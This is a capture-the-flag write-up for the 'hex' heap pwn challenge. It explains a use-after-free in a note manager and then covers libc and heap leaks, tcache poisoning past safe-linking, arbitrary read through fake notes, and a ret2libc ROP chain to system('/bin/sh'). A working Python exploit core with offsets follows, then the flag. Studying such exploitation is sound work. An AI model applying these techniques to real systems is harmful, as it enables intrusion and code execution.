---
title: "HyperSonic CTF 2026 hex Writeup"
description: "HyperSonic CTF 2026 hex writeup"
---

# hex

## Overview

`hex` is a pwn challenge in the form of a heap note manager. The program provides `create`, `read`, `edit`, and `delete` menus, and stores up to `16` note pointers in a global array.

The challenge setup:

- Category: `pwnable`
- Mitigations: PIE, Full RELRO, NX, stack canary
- Provided libc: glibc `2.43`
- Goal: use a heap UAF to redirect the execution flow to `system("/bin/sh")`.

The key is how a note is stored inside a heap chunk. The pointer is not cleared after `delete`, so we can `read` or `edit` a freed chunk again.

## Analyzing the challenge

The structures used in the solution:

- `notes[i]`: the note pointer stored in the global array.
- `note->size`: the requested size stored in the first `8` bytes of the note chunk.
- `note->data`: the user data region starting at `note + 8`.
- `chunk_user`: the address returned to the user region from a glibc chunk.
- `safe-linking`: a mitigation that stores the tcache `fd` in the form `next ^ (chunk_user >> 12)`.

`create_note` behaves as follows.

```c
note = malloc(size + 9);
read(0, note + 8, size);
*(uint64_t *)note = size;
notes[idx] = note;
```

The requested `size` is stored in the first `8` bytes of the chunk, and the actual data goes in from `note + 8`. `read_note` and `edit_note` use the same structure.

```c
// read_note
len = notes[idx]->size;
if (len > 0x300)
    len = 0x300;
write(1, notes[idx] + 8, len);

// edit_note
read(0, notes[idx] + 8, notes[idx]->size);
```

`read_note` limits the output length to at most `0x300`, but `edit_note` has no separate upper bound. So if we can make the `note->size` value large, we can overwrite from `note + 8` into the following chunk.

The vulnerability occurs in `delete_note`.

```c
free(notes[idx]);
```

It does not set `notes[idx]` to `NULL` after `free`. So as long as the index is in range, we can keep reading and editing a freed note, which gives a UAF.

## Key idea

Since we can read a freed chunk, we first obtain libc and heap addresses from allocator metadata. Then we exploit the fact that a freed tcache chunk's `note->size` turns into a safe-linking value.

When a small chunk goes into the tcache, the first `8` bytes of the user region store the `fd`. For a single entry, an encoded NULL is placed there, so the value is roughly as follows.

```text
note->size = chunk_user >> 12
```

The program still interprets this value as `note->size`. If we `edit` a stale note, `read` is called with a very large length, and since the write start position is `note + 8`, we can overflow into the following chunk.

A chunk's own tcache `fd` is at `note + 0`, and because `edit` writes from `note + 8`, changing the same chunk's `fd` directly is hard. Instead, we trigger an overflow from a freed source chunk placed in front and fix the `fd` of the victim tcache chunk immediately behind it.

The layout I used:

```text
O  = overflow source chunk
V2 = victim tcache chunk
V1 = victim tcache chunk
```

The free order is `O`, `V1`, `V2`. At this point the tcache list for the victim size is `V2 -> V1`. While editing the stale `O`, we preserve `V2`'s header and only change its `fd`:

```text
V2->fd = target ^ (V2_user >> 12)
```

Then allocating twice with the same size returns `V2` first and `target` second. This creates a fake note at a location we choose, and reading or creating that note lets us read and write memory.

## Solution walkthrough

### Step 1. Leak the libc address via UAF

We create a large note, free it, and read it through the stale pointer. The large chunk goes into the unsorted bin, and the freed chunk's metadata is left with libc-internal pointers.

`read_note` prints from `note + 8`, so the first `8` bytes give one unsorted-bin pointer. In the analyzed environment this pointer was `0x212ac8` away from the libc base.

```text
libc_base = leaked_unsorted_pointer - 0x212ac8
```

This value gives the addresses of `environ`, `system`, the `"/bin/sh"` string, and the ROP gadgets we need.

### Step 2. Leak a heap address via largebin metadata

After obtaining the libc base, we sort the same stale chunk into a largebin to get a heap address. If we allocate an even larger chunk while the large chunk is freed, the existing unsorted chunk goes through the bin-sorting process, and the largebin's `nextsize`-family pointers are left with a heap address.

Reading this region again with a stale read gives the heap base, which we need later to compute `V2_user >> 12` accurately during tcache poisoning.

### Step 3. Set up tcache poisoning via source chunk overflow

We build the `O`, `V2`, `V1` layout described above. We make `O` a small size, and `V2` and `V1` the same size.

```text
create(O)
create(V2)
create(V1)
delete(O)
delete(V1)
delete(V2)
```

Freeing `O` turns `O`'s first `8` bytes into a safe-linked tcache value. The program uses this value as `note->size`, so `edit(O)` writes long data from `O + 8`.

We tune the overflow payload so `V2`'s chunk header stays intact.

```text
padding
prev_size = 0
size      = victim_chunk_size | 1
fd        = target ^ (V2_user >> 12)
```

Then allocating twice with the victim size makes the second allocation return `target`. Repeating this gives arbitrary read and a stack overwrite.

### Step 4. Build arbitrary read with a fake note

The program's `read_note` reads from `notes[idx] + 8`. So if we want to read some address `addr`, we create a note pointer at `addr - 8` via tcache poisoning.

```text
fake_note = addr - 8
read_note(fake_note) -> read from addr
```

We read near libc's `environ` to get the current stack address.

```text
environ = libc_base + 0x219de8
```

Then we read around the stack address from `environ` and find the saved return address that returns to `main` after the `read_note` call. In this challenge the PIE offset of that return address is `0x17a9`.

```text
saved_return_address = pie_base + 0x17a9
saved_rbp            = address_of_saved_return_address - 8
```

Once we know `saved_rbp`, allocating a fake note on the stack via `create` lets us write the ROP chain from `saved_rbp + 8`.

### Step 5. Write a ret2libc chain to the saved RIP

We set the tcache poisoning target address to `saved_rbp`. `create` writes the requested size to the first `8` bytes of the returned pointer, and the input data goes in from after that.

From the stack frame's point of view it lines up as follows.

```text
saved_rbp      <- note->size
saved_rbp + 8  <- input_data[0:8]
```

So the first `8` bytes of the input data become the saved RIP. I built the ROP chain as a ret2libc.

```text
ret
pop rdi ; ret
"/bin/sh"
system
```

The `ret` gadget goes in front to fix the stack alignment.

## Exploit / Solver

The final exploit flow:

```text
1. Obtain the libc base via an unsorted bin UAF read.
2. Obtain a heap address via a largebin metadata UAF read.
3. Poison the tcache fd via source chunk overflow.
4. Read `environ` and the stack window using a fake note.
5. Find the saved return address and compute the saved RBP.
6. Write the ROP chain to the saved RIP with the same poisoning routine.
```

Below is the core routine of the exploit. The menu I/O functions `create`, `read_exact`, `edit`, and `delete` are assumed to invoke the program behavior analyzed above as-is.

```python
LIBC_LEAK_OFF = 0x212AC8
ENVIRON_OFF = 0x219DE8
SYSTEM_OFF = 0x5C560
BINSH_OFF = 0x1DB799
RET_OFF = 0x289FE
POP_RDI_OFF = 0x11BCFA
READ_NOTE_RET_OFF = 0x17A9


def chunk_size(note_size):
    req = note_size + 9
    if req + 8 + 15 < 0x20:
        return 0x20
    return (req + 8 + 15) & ~0xF


def leak_bases(io):
    io.create(0, 0x500, b"A")
    io.create(1, 0x20, b"B")
    io.delete(0)

    libc_leak = u64(io.read_exact(0, 0x300)[:8])
    libc_base = libc_leak - LIBC_LEAK_OFF

    io.create(2, 0x600, b"C")
    largebin = io.read_exact(0, 0x300)
    heap = u64(largebin[8:16])

    io.create(0, 0x500, b"D")
    top = heap + chunk_size(0x500) + chunk_size(0x20) + chunk_size(0x600)
    return libc_base, heap, top


class Exploit:
    def __init__(self, io, top):
        self.io = io
        self.top = top
        self.next_idx = 3
        self.poison_no = 0

    def next_source_size(self):
        sizes = [1, 0x20, 0x60, 0xA0, 0xC0, 0xE0, 0x100]
        size = sizes[self.poison_no]
        self.poison_no += 1
        return size

    def poison_alloc(self, target, note_size, data=b"Z"):
        o = self.next_idx
        v2 = self.next_idx + 1
        v1 = self.next_idx + 2
        fake = self.next_idx + 3
        self.next_idx += 4

        o_size = self.next_source_size()
        o_csize = chunk_size(o_size)
        victim_csize = chunk_size(note_size)
        v2_user = self.top + o_csize + 0x10
        self.top += o_csize + victim_csize * 2

        self.io.create(o, o_size, b"O")
        self.io.create(v2, note_size, b"V")
        self.io.create(v1, note_size, b"W")
        self.io.delete(o)
        self.io.delete(v1)
        self.io.delete(v2)

        encoded = target ^ (v2_user >> 12)
        payload = b"A" * (o_csize - 0x18)
        payload += p64(0)
        payload += p64(victim_csize | 1)
        payload += p64(encoded)
        self.io.edit(o, payload)

        self.io.create(v2, note_size, b"Q")
        self.io.create(fake, note_size, data)
        return fake

    def read_memory(self, addr, size):
        fake = self.poison_alloc(addr - 8, size)
        return self.io.read_exact(fake, size)

    def leak_environ(self, libc_base):
        data = self.read_memory(libc_base + ENVIRON_OFF - 0x10, 0x40)
        return u64(data[0x10:0x18])

    def find_saved_rbp(self, stack_addr):
        start = (stack_addr - 0x408 - 8) & ~0xF
        data = self.read_memory(start + 8, 0x300)

        for off in range(0, len(data) - 8, 8):
            value = u64(data[off:off + 8])
            if (value & 0xFFF) != (READ_NOTE_RET_OFF & 0xFFF):
                continue

            pie_base = value - READ_NOTE_RET_OFF
            if pie_base & 0xFFF:
                continue

            ret_slot = start + 8 + off
            return ret_slot - 8, pie_base

        raise RuntimeError("saved return address not found")

    def write_rop(self, libc_base, saved_rbp):
        chain = b"".join([
            p64(libc_base + RET_OFF),
            p64(libc_base + POP_RDI_OFF),
            p64(libc_base + BINSH_OFF),
            p64(libc_base + SYSTEM_OFF),
        ])
        self.poison_alloc(saved_rbp, 0x80, chain)
```

In I/O, `scanf("%d")` and `read` are mixed. If you send the number and the binary payload at once, the first non-numeric byte can be left in the stdio buffer. So sending the numeric input line by line, and sending the payload after receiving the `data>` prompt, made it work reliably.

## Result

In local verification, after the ROP chain ran, the shell command produced `LOCAL_SHELL_OK`. The flag from the remote execution log:

```text
hs{92b7694d7d47a73a79e554f823e88d8a70754d86d10b00cc7d5e4b9728607d26}
```
